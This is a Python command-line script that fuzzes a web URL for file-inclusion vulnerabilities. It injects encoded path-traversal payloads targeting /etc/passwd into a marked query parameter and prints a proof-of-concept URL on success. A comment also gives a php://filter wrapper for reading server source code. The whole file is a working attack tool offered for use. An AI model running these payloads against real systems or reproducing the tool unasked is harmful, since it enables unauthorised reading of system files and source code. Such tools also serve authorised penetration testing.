#!/bin/env python
# coding=utf-8

import requests
import argparse
from urllib.parse import urlparse

target_flag = 'XXpathXX'
# read source:
# php://filter/read=convert.base64-encode/resource=./index.php
# reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

payloads = {
    '/etc/passwd': 'root:',
    '/etc/passwd%00': 'root:',
    '%252e%252e%252fetc%252fpasswd': 'root:',
    '%252e%252e%252fetc%252fpasswd%00': 'root:',
    '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd': 'root:',
    '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00': 'root:'
}


def get_headers(headers):
    header_obj = {
        'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0'
    }
    if headers:
        headers = headers.split(',')
        for i in headers:
            key, value = i.split(':')
            header_obj[key.lower()] = value.strip()
    return header_obj


def fuzzer(args):
    url = args['url']
    headers = args['headers']
    verbose = args['verbose']
    if url.startswith('http') or url.find(target_flag) != -1:
        header_obj = get_headers(headers)
        if verbose:
            print('[*] HEADERS:', str(header_obj))
        for key in payloads:
            target = url.replace(target_flag, key)
            res = requests.get(target, headers=header_obj)
            status_code = res.status_code
            if status_code == 200:
                if res.content.decode('utf-8').find(payloads[key]) != -1:
                    print("[+] POC: %s" % (target))
                    return
                elif verbose:
                    print("[*] %s is not vulnerable" % target)
            elif str(status_code).startswith('3'):
                print("[*] Target redirect, maybe you should change cookie")
                return
            else:
                print("[x] %s is not vulnerable" % url)
                return
        print("[x] %s is not vulnerable" % url)
    else:
        print('[x] url is invalid')


def main():
    parse = argparse.ArgumentParser(
        description='This program is designed to fuzz remote or local include vulnerability')
    parse.add_argument('url', action='store',
                       help='target url, you must replace the target query variable\'s value with XXpathXX')
    parse.add_argument('-H', default='', dest='headers',
                       action='store', help='http headers')
    parse.add_argument('-v', dest='verbose',
                       action='store', help='show verbose')
    args = vars(parse.parse_args())
    fuzzer(args)


if __name__ == '__main__':
    main()
